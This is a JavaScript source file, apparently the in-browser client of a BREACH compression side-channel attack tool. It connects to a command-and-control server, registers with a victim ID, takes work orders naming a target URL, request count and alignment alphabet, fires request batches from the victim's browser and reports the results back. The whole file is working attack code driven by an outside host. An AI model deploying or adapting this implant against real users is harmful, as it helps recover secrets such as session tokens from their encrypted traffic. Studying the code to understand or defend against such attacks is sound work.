const io = require('socket.io-client'),
      req = require('./request.js'),
      config = require('./config.js');

var BREACHClient = {
    ONE_REQUEST_TIMEOUT: 5000,
    MORE_WORK_TIMEOUT: 10000,
    _socket: null,
    init() {
        this._socket = io.connect(config.COMMAND_CONTROL_URL);
        this._socket.on('connect', () => {
            console.log('Connected');
            this._socket.emit('client-hello', {
                VICTIM_ID: config.VICTIM_ID
            });
        });
        this._socket.on('do-work', (work) => {
            console.log('do-work message');
            this.doWork(work);
        });
        this._socket.on('server-hello', () => {
            this.getWork();
            console.log('Initialized');
	 });
    },
    noWork() {
        console.log('No work');
        setTimeout(this.getWork.bind(this), this.MORE_WORK_TIMEOUT);
    },
    doWork(work) {
        var {url, amount, alignmentalphabet} = work;

        // TODO: rate limiting
        if (typeof url == 'undefined') {
            this.noWork();
            return;
        }
        console.log('Got work: ', work);

        const reportCompletion = (success) => {
            if (success) {
                console.log('Reporting work-completed to server');
            }
            else {
                console.log('Reporting work-completed FAILURE to server');
            }

            this._socket.emit('work-completed', {
                work: work,
                success: success,
                host: window.location.host
            });
        }
        req.Collection.create(
            url,
            {amount: amount, alignmentalphabet: alignmentalphabet},
            function() {},
            reportCompletion.bind(this, true),
            reportCompletion.bind(this, false)
        );
    },
    getWork() {
        console.log('Getting work');
        this._socket.emit('get-work');
    }
};


BREACHClient.init();
